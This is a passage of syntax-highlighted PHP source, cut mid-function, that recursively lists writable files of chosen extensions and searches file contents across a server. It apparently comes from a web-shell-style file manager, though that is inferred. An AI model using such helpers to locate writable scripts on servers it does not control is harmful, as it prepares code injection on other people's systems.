<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">j</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">GetWDirList(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">closedir(</span>$<span style="color: #eeeeec;">dh</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">clearstatcache(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">dirdata</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">GetWFileList</span>($<span style="color: #eeeeec;">dir</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">filedata</span>,$<span style="color: #eeeeec;">j</span>,$<span style="color: #eeeeec;">nowpath</span>, $<span style="color: #eeeeec;">writabledb</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">j</span> &amp;&amp; $<span style="color: #eeeeec;">j</span>=<span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">dh</span> = <span style="color: #eeeeec; background-color: #2e3436;">opendir(</span>$<span style="color: #eeeeec;">dir</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> ($<span style="color: #eeeeec;">file</span> = <span style="color: #eeeeec; background-color: #2e3436;">readdir(</span>$<span style="color: #eeeeec;">dh</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">ext</span> = <span style="color: #eeeeec; background-color: #2e3436;">getext(</span>$<span style="color: #eeeeec;">file</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">f</span>=<span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'//'</span>,<span style="color: #ad7fa8; font-style: italic;">'/'</span>,$<span style="color: #eeeeec;">dir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'.'</span> &amp;&amp; $<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'..'</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">is_dir(</span>$<span style="color: #eeeeec;">f</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">GetWFileList(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span>($<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'.'</span> &amp;&amp; $<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'..'</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">is_file(</span>$<span style="color: #eeeeec;">f</span>) &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">in_array(</span>$<span style="color: #eeeeec;">ext</span>, <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">','</span>, $<span style="color: #eeeeec;">writabledb</span>))){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_writable(</span>$<span style="color: #eeeeec;">f</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span>$<span style="color: #eeeeec;">nowpath</span>,<span style="color: #ad7fa8; font-style: italic;">''</span>,$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'size'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>@<span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">f</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'mtime'</span>]=<span style="color: #729fcf; font-weight: bold;">@date</span>(<span style="color: #ad7fa8; font-style: italic;">'Y-m-d H:i:s'</span>,<span style="color: #eeeeec; background-color: #2e3436;">filemtime(</span>$<span style="color: #eeeeec;">f</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'filechmod'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getChmod(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getPerms(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'fileowner'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getUser(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>]=$<span style="color: #eeeeec;">dir</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]=$<span style="color: #eeeeec;">f</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">j</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">closedir(</span>$<span style="color: #eeeeec;">dh</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">clearstatcache(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">filedata</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">return</span> <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">GetSFileList</span>($<span style="color: #eeeeec;">dir</span>, $<span style="color: #eeeeec;">content</span>, $<span style="color: #eeeeec;">re</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">global</span> $<span style="color: #eeeeec;">filedata</span>,$<span style="color: #eeeeec;">j</span>,$<span style="color: #eeeeec;">nowpath</span>, $<span style="color: #eeeeec;">writabledb</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">j</span> &amp;&amp; $<span style="color: #eeeeec;">j</span>=<span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">dh</span> = <span style="color: #eeeeec; background-color: #2e3436;">opendir(</span>$<span style="color: #eeeeec;">dir</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> ($<span style="color: #eeeeec;">file</span> = <span style="color: #eeeeec; background-color: #2e3436;">readdir(</span>$<span style="color: #eeeeec;">dh</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">ext</span> = <span style="color: #eeeeec; background-color: #2e3436;">getext(</span>$<span style="color: #eeeeec;">file</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">f</span>=<span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'//'</span>,<span style="color: #ad7fa8; font-style: italic;">'/'</span>,$<span style="color: #eeeeec;">dir</span>.<span style="color: #ad7fa8; font-style: italic;">'/'</span>.$<span style="color: #eeeeec;">file</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'.'</span> &amp;&amp; $<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'..'</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">is_dir(</span>$<span style="color: #eeeeec;">f</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">GetSFileList(</span>$<span style="color: #eeeeec;">f</span>, $<span style="color: #eeeeec;">content</span>, $<span style="color: #eeeeec;">re</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span>($<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'.'</span> &amp;&amp; $<span style="color: #eeeeec;">file</span>!=<span style="color: #ad7fa8; font-style: italic;">'..'</span> &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">is_file(</span>$<span style="color: #eeeeec;">f</span>) &amp;&amp; <span style="color: #eeeeec; background-color: #2e3436;">in_array(</span>$<span style="color: #eeeeec;">ext</span>, <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">','</span>, $<span style="color: #eeeeec;">writabledb</span>))){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">find</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">re</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ( <span style="color: #eeeeec; background-color: #2e3436;">preg_match(</span><span style="color: #ad7fa8; font-style: italic;">'@'</span>.$<span style="color: #eeeeec;">content</span>.<span style="color: #ad7fa8; font-style: italic;">'@'</span>,$<span style="color: #eeeeec;">file</span>) || <span style="color: #eeeeec; background-color: #2e3436;">preg_match(</span><span style="color: #ad7fa8; font-style: italic;">'@'</span>.$<span style="color: #eeeeec;">content</span>.<span style="color: #ad7fa8; font-style: italic;">'@'</span>, @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span>$<span style="color: #eeeeec;">f</span>)) ){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">find</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ( <span style="color: #eeeeec; background-color: #2e3436;">strstr(</span>$<span style="color: #eeeeec;">file</span>, $<span style="color: #eeeeec;">content</span>) || <span style="color: #eeeeec; background-color: #2e3436;">strstr(</span> @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span>$<span style="color: #eeeeec;">f</span>),$<span style="color: #eeeeec;">content</span> ) ) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">find</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">find</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'filename'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span>$<span style="color: #eeeeec;">nowpath</span>,<span style="color: #ad7fa8; font-style: italic;">''</span>,$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'size'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">sizecount(</span>@<span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">f</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'mtime'</span>]=<span style="color: #729fcf; font-weight: bold;">@date</span>(<span style="color: #ad7fa8; font-style: italic;">'Y-m-d H:i:s'</span>,<span style="color: #eeeeec; background-color: #2e3436;">filemtime(</span>$<span style="color: #eeeeec;">f</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'filechmod'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getChmod(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'fileperm'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getPerms(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'fileowner'</span>]=<span style="color: #eeeeec; background-color: #2e3436;">getUser(</span>$<span style="color: #eeeeec;">f</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'dirlink'</span>]=$<span style="color: #eeeeec;">dir</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">filedata</span>[$<span style="color: #eeeeec;">j</span>][<span style="color: #ad7fa8; font-style: italic;">'server_link'</span>]=$<span style="color: #eeeeec;">f</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">j</span>++;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">closedir(</span>$<span style="color: #eeeeec;">dh</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">clearstatcache(</span>);
